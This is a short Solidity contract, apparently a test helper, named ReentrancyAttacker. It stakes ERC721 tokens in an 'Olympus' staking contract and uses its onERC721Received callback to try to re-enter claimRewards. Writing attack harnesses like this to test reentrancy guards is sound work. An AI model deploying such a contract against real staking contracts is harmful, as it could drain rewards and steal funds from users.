// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import { ERC721 } from "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import { ERC721Holder } from "@openzeppelin/contracts/token/ERC721/utils/ERC721Holder.sol";
import { Olympus } from "src/Olympus.sol";

contract ReentrancyAttacker is ERC721Holder {
    ERC721 private immutable MerakiToken;
    Olympus private immutable olympus;

    constructor(ERC721 _merakiToken, Olympus _olympus) {
        MerakiToken = _merakiToken;
        olympus = _olympus;
        MerakiToken.setApprovalForAll(address(_olympus), true);
    }

    function stake(uint256[] memory _ids) external {
        olympus.stake(_ids);
    }

    function unstake(uint256 _amount) external {
        olympus.unstake(_amount);
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) public override returns (bytes4) {
        // Try to re-enter into olympus.
        olympus.claimRewards(address(this));
        return this.onERC721Received.selector;
    }
}
